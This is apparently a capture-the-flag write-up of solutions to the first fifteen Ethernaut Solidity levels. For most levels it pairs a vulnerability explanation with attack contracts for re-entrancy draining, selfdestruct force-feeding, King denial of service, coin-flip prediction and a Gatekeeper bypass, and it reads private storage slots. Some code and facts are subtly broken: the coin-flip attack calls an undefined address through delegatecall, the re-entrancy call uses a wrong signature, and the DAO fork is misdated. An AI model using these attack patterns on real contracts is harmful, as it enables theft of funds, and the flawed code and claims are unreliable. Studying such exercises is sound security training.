# Ethernauts Solutions!

This is a series of solutions for the famous Ethernauts series by OpenZeppelin. Ethernauts is a great "capture-the-flag" style educational series designed to train Solidity developers in identifying and (hopefully avoiding) subtle vulnerabilities in contracts. 

I highly recommend tracking all your transactions with Etherscan and Tenderly. PRs with more efficient solutions are welcome !!

## P1 - Fallback

A **Fallback** function is a function of last resort for any smart contract. It doesn't have a unique identifier and is invoked when no other function in the contract meets the criteria for an external call. This could happen if an external party mistypes the name of a function, gives the wrong arguments, or simply calls something that doesn't exist. 

Notably, fallback functions are also called when someone sends only ether to a contract (without other information). By default, smart contracts cannot accept such Ether, but they are able to if an appropriate fallback function is implemented in them. 

**Properties** - 

 - Has no name or arguments. Can be marked payable. 
 - Can not return anything. 
 - Can be called by anyone (EOA or Contract)
 - Can be defined once per contract. 
 - It is mandatory to mark it external.
 - Limited to 2300 gas when called by another function. 

**Vulnerability** - Fallback function enables the transfer of ownership of this contract. 

**Exploit** - 

Step 1 - Call the "contribute" function with the requisite amount of seed capital 
Step 2 - Send a transaction without the data field to send a menial amount of Ether.

Useful code - *contract.sendTransaction({from: player,value: toWei(...)})*

**Learning** - 

 - Follow check-emt-interactions in fallbacks too 
 - Emit an event for any state change in a fallback 
 - Do not implement ownership change or other important state changes in a fallback

##  P2 - Fallout 

This problem just goes to show - being a giga-brain isn't always the best thing to defend yourself against an exploit. You have to develop an "adversarial" mindset if you want to write contracts. In this case, the point is whoever wrote this contract wanted it to be hacked. 

Here, note the word "fallout" is misspelled and can easily be called by anyone to change ownership of the contract. Be observant, and don't just plainly trust whoever wrote the contract. 


## P3 - Coin Flip

A lot of modern cryptography depends on random numbers. By extension, so does web3 and blockchain tech. As such, the integrity of these random numbers becomes very important. How truly random are they ? 

The reader is advised that a computer generates much differently from the human brain. It follows an algorithm. So, the number it spits out isn't really random after all. Then, it all becomes a problem of - can someone predict which number these algorithm will spit out  in advance. 

Short answer - if you are using a commonly available piece of information as input to this algorithm - someone can. Timestamps and block numbers are good examples of such common knowledge. 

**Vulnerability** - The contract uses the publicly available block number as input. 

**Exploit** - 

Step 1 - Replicate the randomness logic of the contract in Remix IDE
Step 2 - Using the block number, generate deterministic random numbers
Step 3 (Automation)  - Call the victim contract from your contract so block numbers sync
Step 3 - Feed into contract 10 times over, with slight delays between each  

    // SPDX-License-Identifier: MIT    
    pragma  solidity  ^0.8.7;

    contract CoinFlipAttack {

	    uint256 lastHash;
	    address  public victimContract;
	    uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
	   
	    constructor(address _victimContractAddress)  {
		    victimContract = _victimContractAddress;
	    }
	        
	    function flipResult(uint _blockNumber)  public  returns  (bool side)  {
		    uint256 blockValue =  uint256(blockhash(_blockNumber));
		    if  (lastHash == blockValue)  {
				revert();
			}
			lastHash = blockValue;
			uint256 coinFlip = blockValue / FACTOR;
		    side = coinFlip ==  1  ?  true  :  false;
	    }
	    
	      
	    
	    function attackContract()  external  returns(bool success)  {
		    bool guess = flipResult(block.number);
		    (success,  )  = attackContractAddress.delegatecall(abi.encodeWithSignature("flip(bool)", guess));
		   }
    }

**Learning** - 

 - Use verifiable randomness, as offered by Chainlink et al. wherever needed 
 - Execute atomic transactions to ensure conditions are either fully met or reverted

## P4 - Telephone

This example highlights the glaring difference between `tx.origin` and `msg.sender` primitives. While `msg.sender` can take various forms depending on whether you are calling a function through a proxy contract delegate call etc. - `tx.origin` is always you (the original caller).

**Vulnerability** - The contract uses `tx.origin` as an authentication point for an agent. 

**Exploit** - 

Step 1 - Make a bogus contract and call the changeOwner() function through it. 

**Learning** - 

 - Never use `tx.origin` as a means to authorize or validate a wallet in your contract.
 
## P5 - Token (Deprecated)

Following Solidity 0.8.0, integer overflows are no longer feasibly in smart contract. Before that, contracts would have to be written using OpenZeppelin's SafeMath Library. This is integrated into Solidity now. 

## P6 - Delegation 

The Delegate Call is a very powerful idea in solidity - since it allows an agent to interact with a contract through an intermediatory contract whilst maintain their status as "caller". This idea underpins complex developments like upgradeable smart contracts. 

![](https://miro.medium.com/max/875/1*4OB3IwTF1AkW6zH3tJv8Tw.png)

For further analysis, compare this image with a standard call, as described in the image below - 
![](https://miro.medium.com/max/875/1*PwYIsFyDM60IW4KuDkUncA.png)

The most important thing to remember is that even though the EOA is making a "function call" to the target contract, the execution of this function will **not** change the state of the target contract. It will change the state of the caller contract, at precisely the same position in it's stack that corresponds with whatever that function would have changed in the target contract. 

In this example, we notice that the fallback function allows us to make a delegate call to another contract, that can possibly help us become the contract owner. Good for us, the delegate call will not change the owner of the Delegate() contract, but that of Delegation(). 

**Vulnerability** - The contract  exposes ownership to an unsecured delegate call.

**Exploit** - 

Step 1 - Create a function call to the Delegation() contract, calling pwn() 
Step 2 - Since pwn() does not exist in Delegation, it will invoke Delegate() 
Step 3 - Since state change happens on Delegation() - we become the owner 


    await sendTransaction({
      from: "<Your address>",
      to: "<Target contract address>",
      data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    });
	
**Design Question** - Why can we not implement this by making a bogus contract and calling a delegate call through that ?

Because, delegate calls only work at the end points of the chain. That means, even if you have 5 contracts linked together in a chain of delegate calls from one to another - 
say D1 -> D2 -> D3 -> D4 -> D5 - the logic will be executed from D5 and the state will only be changed in D1.

In this case, that means you will end up being the owner of the bogus contract you create and nothing else. 

**Learning** - 

 - Authenticate and do conditional checks on functions that invoke, or can be invoked by a delegate call 
 - Avoid making state changes through delegate calls  

## P7 - Force

As mentioned before, a smart contract **cannot** just receive random ether from anywhere. There are only 3 scenarios in which a contract can get Ether. These are - 

 - Via **payable functions**:  Fallback functions can be included in a
   contract to intentionally allow your contract to receive Ether from
   other contracts and external wallets.
 - Via **mining reward**: contract addresses can be designated as the   
   recipients of mining block rewards.
 - Via a **destroyed contract**: Selfdestruct() lets you designate a backup   
   address to receive the remaining ethers from the contract you are   
   destroying.

In this case, our contract has no implementation - so no contract code to exploit. So we will just make a bogus contract and destroy that to fund this contract. 

**Exploit** - 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract ForceAttack {
    
	    address  public victimContract;
    
	    constructor(address _victimContractAddress)  payable  {
		    require(msg.value <=  0.001 ether,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
    
	    function attackContract() external  {
		    selfdestruct(payable(address(victimContract)));
	    }
    }
    
**Learning** - 

 - Never use the balance of your contract as a check for anything, it can be altered

## P8 - Vault 

Spoiler alert - making a variable private does not mean only your contract can access it. Blockchains are inherently transparent, and private variables can be seen by a one who wants to, albeit with a little more effort. To do so, all we need to do is understand how a contract's data is stored. 

Ethereum Virtual Machine (EVM) is a stack-based Turing-complete machine. This means it is different from your typical computer, which is register-based. The EVM's sotrage scheme is comprised of "stacks" of 32-bytes each. All in all, the EVM can have 2^256 such stacks. 

Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract’s address. This means, by making a specific EVM-level call, you can access the slots of each contract. 

 **Vulnerability** - The contract  password is stored as a private variable. 

**Exploit** - 

We know the password is stored as a 32-byes value. So, it will have a whole slot associated with it. In this case, this will be the slot at index 1.

    web3.eth.getStorageAt(/* contractAddress */, 1)
        
The result will be hex value of the password we need. To convert it further, we can use the helpful utils library in web3.js - 

    web3.utils.toAscii("")

And finally, we will have the password we are looking for. 

**Learning** - 

 - Always store the **hash** of a confidential value, never the plain text.

As the transaction sender, you are always susceptible to the following cases:

## P9 - King 

In this example, we are once again reminded that if our contract sends Ether to another one - it has to rely on the other contracts receiving mechanism to complete it's workflow. In other words, for a while, your contract is no longer in charge of it's own functioning. 

Such a function call generally comes with three loopholes worth remembering - 

-   **Issue 1**: The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.
-   **Issue 2**: The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.
-   **Issue 3**: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.

Due to this, the "safe-transfer" workflow is generally recommended for solidity contracts. This contract does not follow that workflow at all. 

 **Vulnerability** - The contract  relies on external agent for complete execution. 

**Exploit** - 

Step 1 - Make a bogus contract and transfer some Eth to the victim contract through that using a Delegate Call. Now you are the owner. 
Step 2 - Implement a fallback function which always reverts whenever value is transferred to it. 
Step 3 - Now, the other contract can never reclaim ownership from you. 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract KingAttack {
    
	    address  public victimContract;
	    uint256  public valueToExceed;
	    
	    constructor(address _victimContractAddress)  payable  {
		    valueToExceed = _victimContractAddress.balance;
		    require(msg.value > valueToExceed,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
	    
	    function attackContract()  external  payable  returns(bool success)  {
		    require(msg.value > valueToExceed,  "This will not work");
		    (success,  )  =  address(victimContract).call{value: valueToExceed}(abi.encodeWithSignature(""));
	    }
    
	    receive()  external  payable  {
		    revert();
	    }
    
    }

**Learning** - 

-   Never assume transactions to external contracts will be successful
-   Make sure to handle failed transactions on the client side in the event you do depend on transaction success to execute other core logic

## P10 - Re Entrancy  

If there's a celebrity exploit out there, it is this one. A re-entrancy attack, though quite un-intuitive at first - is the reason Ethereum had to be forked in 2017 into Eth Classic and Eth. I recommend you study this properly, so here is an [article](https://quantstamp.com/blog/what-is-a-re-entrancy-attack) for reference. 

 **Vulnerability** - Withdrawal function is easily re-entrant. 

**Exploit** - 

Step 1 - Make a re-entracy attack contract, and implement the requisite fallback function in it 
Step 2 - Call the withdrawal function repeatedly till the contract is safely out of Eth. 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract ReentrancyAttack {
    
	    address  public victimContract;
	    event WithdrawalPerformed(uint256  indexed _valueExtracted,  bool _status);
	    
	    constructor(address _victimContractAddress)  payable  {
		    require(msg.value >=  0.001 ether,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
	    
	    function attackContract()  external  payable  returns(bool success)  {
		    require(msg.value >=  0.001 ether,  "Please seed the contract");
		    (success,  )  =  address(victimContract).call{value:  0.001 ether}(abi.encodeWithSignature("donate(address)",  address(this)));
	    }
	    
	    function withdrawLoot()  external  returns(bool success){
		    payable(msg.sender).transfer(address(this).balance);
		    success =  true;
	    }
	    
	    receive()  external  payable  {
		    if  (address(victimContract).balance >  0)  {
		    (bool success,  )  =  address(victimContract).call(abi.encodeWithSignature("withdraw(uint)",  address(victimContract).balance));
		    emit WithdrawalPerformed(address(victimContract).balance, success);
		    }
	    }
    
    }
     
**Learning** - 

- Always follow check-emit-transactions design principle 
- Add a Re-entrancy lock to your functions if applicable 

## P11 - Elevator 

Interfaces are a useful tool when designing smart contracts. Just like Java or C, interfaces allow a programmer to specify the structure and functionality of a contract, without implementing it. In Solidity, you need interfaces for - 

-   **Designing contracts:**  by generating a working ABI first, before implementing the actual contract.
-   **Declaring tokens**: by declaring a shared language, so different contracts can use these tokens to handle their business logic.
-   **Not used**: some developer want to  [scrap interfaces altogether](https://github.com/ethereum/solidity/issues/3420), in favor of abstract classes*.

 **Vulnerability** - `Elevator` does not define function from interface.

**Exploit** - 

Step 1 - Make an implementation of the Building interface.
Step 2 - Ensure that isLastFloor() always returns false on first invocation. This way, we always enter the `for` loop in Elevator. 
Step 3 -  isLastFloor() always returns true on second invocation. This way, even if a floor isn't at the top - the contract will think it is. 
Step 4 -  Instantiate the Elevator contract and play with `goTo()` to see it break. 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    interface Building {
	    function isLastFloor(uint)  external  returns  (bool);
    }
    
    contract ElevatorAttack is Building {
    
	    address  public victimContract;
	    bool  public toggled =  false;
	    
	    constructor(address _victimContractAddress)  payable  {
		    victimContract = _victimContractAddress;
	    }
	    
	    function isLastFloor(uint  /*_floorNumber*/  )  external  override  returns  (bool)  {
		    if  (toggled)  {
			    toggled =  false;
			    return  true;
		    }  else  {
			    toggled =  true;
			    return  false;
		    }
	    }
	    
	    function attackContract(uint _floorNumber)  external  payable  returns(bool success)  {
		    (success,  )  = victimContract.call(abi.encodeWithSignature("goTo(uint)", _floorNumber));
	    }
	    
    }
    
**Learning** - 

-  Never rely purely on shared interfaces between contracts, or assume two contracts will have the same implementation. 
-   **Be careful when inheriting contracts that extend from interfaces.** Each layer of abstraction introduces security issues through information obscurity. 

## P12 - Privacy  

The EVM optimizes for a contract to occupy as few slots as possible in order to keep enough space available for execution and other contracts in the system. So, if possible, it stores multiple items of contract data in the same slot. 

![](https://miro.medium.com/max/1400/1*wY8Si-mt_QZWqg0jnEDw8A.jpeg)

In this contract, again, the developer has stored their confidential data in a private variable - all we have to do is extract this data and decipher the password from it. The complication, this time, is the data might be co-habitating in a slot with something else. 

Do remember that constants are not stored in Storage. Also, mappings and dynamic arrays are stored differently. Moreover, each instance of a struct gets its own slot. 

 **Vulnerability** - `data` is still stored in a private variable 
 
**Exploit** - 

Step 1 - Using storage schema described above, predict which slot index the password may be stored in. 
Step 2 - You should conclude that `data` is stored in slots 3, 4 and 5.
Step 3 - Take the first 16 bytes of each slot and try to unlock the program using that information. 
Step 4 - The 5th slot has the password.  

**Learning** - 

-  Do not store plain text information in a contract 
-  Do not put all data in storage - memory is a safe and gas-efficient way to store transient data. 
- **Always stack variables together for gas optimization** 

## P13 - Gatekeeper 1  

This problem checks you on a number of levels, including masking bits, sending transactions and estimating gas costs. Let's start with the gas part - 

Solidity's compiler breaks the code you write down into a number of assembly-level instructions. So far, nothing too different from a regular computer. However, interestingly, there is a gas cost associated with each [instruction](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0). 

Different Solidity **compiler versions** will calculate gas differently. And whether or not **optimization** is enabled will also affect gas usage. Moreover, a "write" instruction is more expensive than a "read" instruction. 

Now, let's look at masking. It is important to remember, compression of data does generally lead to the loss of some information - especially when it is de-compressed later. The following infographic explains this quite well - 

![](https://miro.medium.com/max/875/1*iaHciYKXtdk4-Z9tGaiknw.png)
 
 This idea can be implemented in Solidity using bitwise operations - 

    bytes4 a = 0xffffffff;  
    bytes4 mask = 0xf0f0f0f0;  
    bytes4 result = a & mask ; // 0xf0f0f0f0

 **Vulnerability** - Contract uses easily exploitable gates 

 **Exploit** - 

Step 1 - Make a bogus contract and exploit `gate 1` through that 
Step 2 - To solve for `gate 3` simply come up with a mask using your tx.origin and a mask. I found the following to solve the [problem](https://www.tutorialspoint.com/solidity/solidity_conversions.htm). 

    bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

Step 3 - Finally, to get `gate 2`, I recommend switching to the same compiler version of Remix and then turning gas optimization in Remix off. 
Step 4 - Do some trial and error with gas provided, till your instructions work. 

**Learning** - 

-  Abstain from asserting gas consumption in your smart contracts, as different compiler settings will yield different results.
-  Remember, data corruption does happen when converting data types into different sizes.

## P14 - Gatekeeper 2

Ok - now we're getting in deep. Let's start with the fact that the Ethereum yellow paper specifies the act of contract creation as  

![](https://miro.medium.com/max/1400/1*xG42ImBtHKw5AZR1bWcz8Q.png)

When a contract needs to be created, a transaction is sent to the Ethereum network. This contract creates 0 

-   **Sender [s]**: this is the address of the  _immediate_ contract or external wallet that wants to create a new contract.
-   **Original transactor [o]**: this is the  _original_ EOA (a user) who created the contract. Notice that  `o != s`  if the user used a factory contract to create more contracts!
-   **Available gas [g]**: this is the user specified, total gas allocated for contract creation.
-   **Gas price [p]**: this is the market rate for a unit of gas, which converts the transaction cost into Ethers.
-   **Endowment [v]**: this is the  `value`  (in Wei) that’s being transferred to seed this new contract. The default value is zero.
-   **Initialization EVM code [i]**: this is everything inside your new contract’s  `constructor`  function and the initialization variables, in bytecode format. 

What follows after is an algorithm that allows your contract to live at a specific address in the EVM - 

1. Based on just the transaction’s input data, the new contract’s designated address is calculated. At this stage, the input state values are modified, but the new contract’s state is still empty.

2. The initialization code kickstarts in the EVM and creates an actual contract.

3. State variables are changed, data is stored, and gas is consumed and deducted.

4. Once the contract finishes initializing, it stores its own code in association with its calculated address.

5. Finally, the remaining gas and a success/failure message is asynchronously returned to the sender  `s`.

So, we must notice that from steps 1 -3, there is no contract code available at the contract's address.  This is confirmed by calling `extcodesize(address)` and getting a value of 0 before step 4 is carried out.  

 **Vulnerability** - Contract depends on other contract to be un-initialized to carry out entry. 


  **Exploit** - 

Step 1 - Make a mask to pass `gate 3`
Step 2 -  To ensure the contract address still comes out with an exit code of 0 for `gate 2` -  simply put the call to the victim contract in the `constructor()`

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract GatekeeperAttack {
     
	    constructor(address _victimContractAddress)  {
		    address gate = _victimContractAddress;
		    bytes8 key =  bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this)))))  ^  (uint64(0)  -  1));
		    (bool success,  )  = gate.call(abi.encodeWithSignature("enter(bytes8)", key));
	    }
    
    }

**Learning** - 

-  Understanding how contract creation occurs.

## P15 - Naught Coin 

And we're back to being easy. Naught Coin goes to re-iterate the point that you should nevvvveeer trust a contract that inherits from an interface, unless you are really familiar with the interface and know the inheritor has implemented it correctly. 

 **Vulnerability** -Naught Coin does not implement the transferFrom() and approve() functions in IERC20.

 **Exploit** - 

Step 1 - Enter instance address in Etherscan Rinkeby and connect your wallet.
Step 2 - `approve()` yourself and `transferFrom()` to another account. 

**Learning** - 

-  Do not trust implementations of unknown interfaces. 
-  If you can, check for  [EIP 165 compliance](https://eips.ethereum.org/EIPS/eip-165), which confirms which interface an external contract is implementing. Conversely, if you are the one issuing tokens, remember to be EIP-165 compliant.

Note - For a helpful tutorial on ERC 165 to implement in future contracts, please do take a look at [this](https://medium.com/@chiqing/ethereum-standard-erc165-explained-63b54ca0d273) article. 
